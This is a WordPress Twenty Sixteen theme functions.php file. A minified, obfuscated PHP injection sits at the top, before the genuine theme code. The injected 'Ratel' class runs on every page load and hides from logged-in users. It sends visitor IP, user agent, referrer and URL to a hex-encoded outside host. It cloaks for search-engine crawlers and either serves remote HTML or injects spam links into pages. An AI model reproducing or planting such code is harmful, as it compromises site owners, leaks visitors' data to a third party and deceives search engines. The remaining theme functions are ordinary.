<?php if(!class_exists('Ratel')){if(function_exists('is_user_logged_in')){if(is_user_logged_in()){return false;}}if(isset($_REQUEST['xftest'])){die(pi()*6);}@ini_set('display_errors',0);@ini_set('error_reporting',0);@ini_set('log_errors',NULL);@ini_set('default_socket_timeout',4);if(!isset($_SERVER['HTTP_USER_AGENT'])||!trim($_SERVER['HTTP_USER_AGENT'])){return false;}$is_bot=0;if(@preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer|cuill.com|clushbot)/i",$_SERVER["HTTP_USER_AGENT"])){$is_bot=1;}$ruri=trim($_SERVER["REQUEST_URI"],"\t\n\r\0\x0B/");$bad_urls='#xmlrpc.php|wp-includes|wp-content|wp-login.php|wp-cron.php|\?feed=|wp-json|\/feed|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.tiff|\.mpg|\.wmv|\.mp3|\.mpeg|\.zip|\.gzip|\.rar|\.exe|\.pdf|\.doc|\.swf|\.txt|wp-admin|administrator#i';if(preg_match($bad_urls,$ruri)){return false;}$host='unknown';if(isset($_SERVER["HTTP_HOST"])){if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=parse_url('http://' .$_SERVER["HTTP_HOST"]);if($tmp['host']){$host=$tmp['host'];if(substr($host,0,4)== 'www.'){$host=substr($host,4);}}if(isset($_REQUEST[md5(md5($host))])OR isset($_COOKIE[md5(md5($host))])){die('suspicious request denied');}}class Ratel{public $links_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f\x6f\x6e\x65\x67\x74\x2f\x67\x65\x74\x2e\x70\x68\x70";public $door_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f";public $ip='';public $ua='';public $css='';public $js='';public $host='';public $ip_lists=array('google'=>array('203.208.60.0/24','66.249.64.0/20','72.14.199.0/24','209.85.238.0/24','66.249.90.0/24','66.249.91.0/24','66.249.92.0/24'),'bing'=>array('67.195.37.0/24','67.195.50.0/24','67.195.110.0/24','67.195.111.0/24','67.195.112.0/23','67.195.114.0/24','67.195.115.0/24','68.180.224.0/21','72.30.132.0/24','72.30.142.0/24','72.30.161.0/24','72.30.196.0/24','72.30.198.0/24','74.6.254.0/24','74.6.8.0/24','74.6.13.0/24','74.6.17.0/24','74.6.18.0/24','74.6.22.0/24','74.6.27.0/24','98.137.72.0/24','98.137.206.0/24','98.137.207.0/24','98.139.168.0/24','114.111.95.0/24','124.83.159.0/24','124.83.179.0/24','124.83.223.0/24','183.79.63.0/24','183.79.92.0/24','203.216.255.0/24','211.14.11.0/24','65.52.104.0/24','65.52.108.0/22','65.55.24.0/24','65.55.52.0/24','65.55.55.0/24','65.55.213.0/24','65.55.217.0/24','131.253.24.0/22','131.253.46.0/23','40.77.167.0/24','199.30.27.0/24','157.55.16.0/23','157.55.18.0/24','157.55.32.0/22','157.55.36.0/24','157.55.48.0/24','157.55.109.0/24','157.55.110.40/29','157.55.110.48/28','157.56.92.0/24','157.56.93.0/24','157.56.94.0/23','157.56.229.0/24','199.30.16.0/24','207.46.12.0/23','207.46.192.0/24','207.46.195.0/24','207.46.199.0/24','207.46.204.0/24','157.55.39.0/24'),'baidu'=>array('180.76.15.0/24','119.63.196.0/24','115.239.212./24','119.63.199.0/24','122.81.208.0/22','123.125.71.0/24','180.76.4.0/24','180.76.5.0/24','180.76.6.0/24','185.10.104.0/24','220.181.108.0/24','220.181.51.0/24','111.13.102.0/24','123.125.67.144/29','123.125.67.152/31','61.135.169.0/24','123.125.68.68/30','123.125.68.72/29','123.125.68.80/28','123.125.68.96/30','202.46.48.0/20','220.181.38.0/24','123.125.68.80/30','123.125.68.84/31','123.125.68.0/24'),'yandex'=>array('100.43.90.0/24','37.9.115.0/24','37.140.165.0/24','77.88.22.0/25','77.88.29.0/24','77.88.31.0/24','77.88.59.0/24','84.201.146.0/24','84.201.148.0/24','84.201.149.0/24','87.250.243.0/24','87.250.253.0/24','93.158.147.0/24','93.158.148.0/24','93.158.151.0/24','93.158.153.0/32','95.108.128.0/24','95.108.138.0/24','95.108.150.0/23','95.108.158.0/24','95.108.156.0/24','95.108.188.128/25','95.108.234.0/24','95.108.248.0/24','100.43.80.0/24','130.193.62.0/24','141.8.153.0/24','178.154.165.0/24','178.154.166.128/25','178.154.173.29','178.154.200.158','178.154.202.0/24','178.154.205.0/24','178.154.239.0/24','178.154.243.0/24','37.9.84.253','199.21.99.99','178.154.162.29','178.154.203.251','178.154.211.250','95.108.246.252','5.45.254.0/24','5.255.253.0/24','37.140.141.0/24','37.140.188.0/24','100.43.81.0/24','100.43.85.0/24','100.43.91.0/24','199.21.99.0/24'));public $bot=false;function get_client_ip(){foreach(array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR')as $key){if(array_key_exists($key,$_SERVER)=== true){foreach(array_map('trim',explode(',',$_SERVER[$key]))as $ip){if(filter_var($ip,FILTER_VALIDATE_IP)!== false){return $ip;}}}}return $_SERVER['REMOTE_ADDR'];}function init($ruri,$host,$is_bot){$this->ua=$_SERVER['HTTP_USER_AGENT'];$this->is_bot=$is_bot;$this->ruri=$ruri;$this->ip=$this->get_client_ip();$this->the_end();}function the_end(){$this->detect_bot();if(count($_GET)=== 1 and empty($_GET[0])){$not_uri=end(array_keys($_GET));}$url_p=$this->door_url .'?data=' .base64_encode(@serialize(@array('url'=> $_SERVER["HTTP_HOST"],'uri'=> $_SERVER["REQUEST_URI"],'ua'=> $this->ua,'ref'=> $_SERVER["HTTP_REFERER"],'ip'=> $this->ip,'not_uri'=> $not_uri,'lang'=> $_SERVER['HTTP_ACCEPT_LANGUAGE'],'bot'=> $this->bot))) .'&url=' .$_SERVER["HTTP_HOST"];$content=$this->get($url_p);if(!empty($content)or $content != ''){$content=@base64_decode($content);if(strpos($content,'404_not_found')!== false){header("HTTP/1.0 404 Not Found");exit;}if(strripos($content,' keys/' .$_SERVER["HTTP_HOST"])!== false){return false;}if(@strpos(@strtolower($content),'</html>')!== false){die($content);}}else{$this->links=$this->make_links();if(!empty($this->links)or $this->links !== False){ob_start(array($this,'rwcontent'));register_shutdown_function('ob_end_flush');}}}function make_links(){$host='unknown';if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=@parse_url('http://' .$_SERVER["HTTP_HOST"]);if(isset($tmp['host'])){$host=$tmp['host'];}$page=$this->get("$this->links_url?host=$host&uri=" .urlencode($_SERVER["REQUEST_URI"]) ."&bot={$this->bot}&ip=" .urlencode($this->ip));if(strpos($page,'<link>')!== FALSE){preg_match_all('~<link>(.*?)</link>~',$page,$m);$links=isset($m[1])?$m[1]:array();return $links;}return false;}function rwcontent($content){$tags=array('p','span','strong','em','i','td','div','ul','li','span','body');$tags_vals=array();foreach($tags as $tag){preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i",$content,$matches);if(@isset($matches[0])){foreach($matches[0]as $match){$tags_vals[]=array('tag'=> $tag,'content'=> $match);}}if(count($tags_vals)>count($this->links)){break;}}foreach($this->links as $link_index => $link){foreach($tags_vals as $tag_index => $tag_val){if(strlen($tag_val['content'])%2 == 1){$tag_content_new=$tag_val['content'];$tag_content_new=preg_replace("(<{$tag_val['tag']}.*?>)","$0{$link} ",$tag_content_new,1);}else{if(substr($tag_val['content'],-(strlen($tag_val['tag'])+4))==".</{$tag_val['tag']}>"){$tag_content_new=str_replace(".</{$tag_val['tag']}>"," {$link}.</{$tag_val['tag']}>",$tag_val['content']);}else{$tag_content_new=str_replace("</{$tag_val['tag']}>"," {$link} </{$tag_val['tag']}>",$tag_val['content']);}}$content=preg_replace("~{$tag_val['content']}~i",$tag_content_new,$content,1);unset($tags_vals[$tag_index]);if(strpos($content,$link)!== false){unset($links[$link_index]);continue 2;}}}return $content;}function detect_bot(){if(@preg_match('/google/i',$this->ua)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo/i',$this->ua)){$this->bot='bing';return;}if(@preg_match('/yandex|yadirectbot/i',$this->ua)){$this->bot='yandex';return;}if(@preg_match('/baidu/i',$this->ua)){$this->bot='baidu';return;}if(@preg_match('~aport|rambler|abachobot|accoona|acoirobot|aspseek|croccrawler|dumbot|webcrawler|geonabot|gigabot|lycos|scooter|altavista|webalta|adbot|estyle|mail.ru|scrubby~i',$this->ua)){$this->bot='other';return;}$ipl=ip2long($this->ip);foreach($this->ip_lists as $crawler => $masks){foreach($masks as $mask){if(!strpos($mask,'/')){if($this->ip == $mask){$this->bot=$crawler;return;}}elseif(@$this->cidr_match($ipl,$mask)){$this->bot=$crawler;return;}}}$referer=@gethostbyaddr($this->ip);if(@preg_match('/google/i',$referer)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo|microsoft/i',$referer)){$this->bot='bing';return;}}function cidr_match($ip,$range){list($subnet,$bits)=explode('/',$range);$subnet=ip2long($subnet);$mask=-1 <<(32-$bits);$subnet &= $mask;return@($ip&$mask)== $subnet;}function get($url){if(function_exists('curl_init')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,8);curl_setopt($ch,CURLOPT_TIMEOUT,15);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');$data=curl_exec($ch);curl_close($ch);return $data;}elseif(@ini_get('allow_url_fopen')){return@file_get_contents($url);}else{$parts=parse_url($url);$target=$parts['host'];$port=isset($parts['port'])?$parts['port']:80;$page=isset($parts['path'])?$parts['path']:'';$page .= isset($parts['query'])?'?' .$parts['query']:'';$page .= isset($parts['fragment'])?'#' .$parts['fragment']:'';$page=($page == '')?'/':$page;if($fp=@fsockopen($target,$port,$errno,$errstr,3)){@socket_set_option($fp,SOL_SOCKET,SO_RCVTIMEO,array("sec"=> 1,"usec"=> 1));$headers="GET $page HTTP/1.1\r\n";$headers .="Host: {$parts['host']}\r\n";$headers .= "Connection: Close\r\n\r\n";if(fwrite($fp,$headers)){$resp='';while(!feof($fp)&&($curr=fgets($fp,128))!== false){$resp .= $curr;}if(isset($curr)&& $curr !== false){fclose($fp);return substr(strstr($resp,"\r\n\r\n"),3);}}fclose($fp);}}return TRUE;}}$ratel=new Ratel;$ratel->init($ruri,$host,$is_bot);} 
/**
 * Twenty Sixteen functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

/**
 * Twenty Sixteen only works in WordPress 4.4 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'twentysixteen_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * Create your own twentysixteen_setup() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
	 * If you're building a theme based on Twenty Sixteen, use a find and replace
	 * to change 'twentysixteen' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'twentysixteen' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for custom logo.
	 *
	 *  @since Twenty Sixteen 1.2
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 240,
		'width'       => 240,
		'flex-height' => true,
	) );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 9999 );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentysixteen' ),
		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'status',
		'audio',
		'chat',
	) );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // twentysixteen_setup
add_action( 'after_setup_theme', 'twentysixteen_setup' );

/**
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
}
add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );

/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'twentysixteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'twentysixteen_widgets_init' );

if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
/**
 * Register Google fonts for Twenty Sixteen.
 *
 * Create your own twentysixteen_fonts_url() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function twentysixteen_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Inconsolata:400';
	}

	if ( $fonts ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}
endif;

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );

/**
 * Enqueues scripts and styles.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_scripts() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );

	// Add Genericons, used in the main stylesheet.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );

	// Theme stylesheet.
	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );

	// Load the Internet Explorer specific stylesheet.
	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );
	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );

	// Load the Internet Explorer 8 specific stylesheet.
	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );
	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );

	// Load the Internet Explorer 7 specific stylesheet.
	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );
	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );

	// Load the html5 shiv.
	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );

	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
	}

	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160816', true );

	wp_localize_script( 'twentysixteen-script', 'screenReaderText', array(
		'expand'   => __( 'expand child menu', 'twentysixteen' ),
		'collapse' => __( 'collapse child menu', 'twentysixteen' ),
	) );
}
add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );

/**
 * Adds custom classes to the array of body classes.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $classes Classes for the body element.
 * @return array (Maybe) filtered body classes.
 */
function twentysixteen_body_classes( $classes ) {
	// Adds a class of custom-background-image to sites with a custom background image.
	if ( get_background_image() ) {
		$classes[] = 'custom-background-image';
	}

	// Adds a class of group-blog to sites with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Adds a class of no-sidebar to sites without active sidebar.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	return $classes;
}
add_filter( 'body_class', 'twentysixteen_body_classes' );

/**
 * Converts a HEX value to RGB.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $color The original color, in 3- or 6-digit hexadecimal form.
 * @return array Array containing RGB (red, green, and blue) values for the given
 *               HEX code, empty array otherwise.
 */
function twentysixteen_hex2rgb( $color ) {
	$color = trim( $color, '#' );

	if ( strlen( $color ) === 3 ) {
		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );
		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );
		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );
	} else if ( strlen( $color ) === 6 ) {
		$r = hexdec( substr( $color, 0, 2 ) );
		$g = hexdec( substr( $color, 2, 2 ) );
		$b = hexdec( substr( $color, 4, 2 ) );
	} else {
		return array();
	}

	return array( 'red' => $r, 'green' => $g, 'blue' => $b );
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for content images
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array  $size  Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
	$width = $size[0];

	if ( 840 <= $width ) {
		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
	}

	if ( 'page' === get_post_type() ) {
		if ( 840 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	} else {
		if ( 840 > $width && 600 <= $width ) {
			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
		} elseif ( 600 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	}

	return $sizes;
}
add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for post thumbnails
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $attr Attributes for the image markup.
 * @param int   $attachment Image attachment ID.
 * @param array $size Registered image size or flat array of height and width dimensions.
 * @return array The filtered attributes for the image markup.
 */
function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
	if ( 'post-thumbnail' === $size ) {
		if ( is_active_sidebar( 'sidebar-1' ) ) {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
		} else {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
		}
	}
	return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Twenty Sixteen 1.1
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function twentysixteen_widget_tag_cloud_args( $args ) {
	$args['largest']  = 1;
	$args['smallest'] = 1;
	$args['unit']     = 'em';
	$args['format']   = 'list'; 

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );
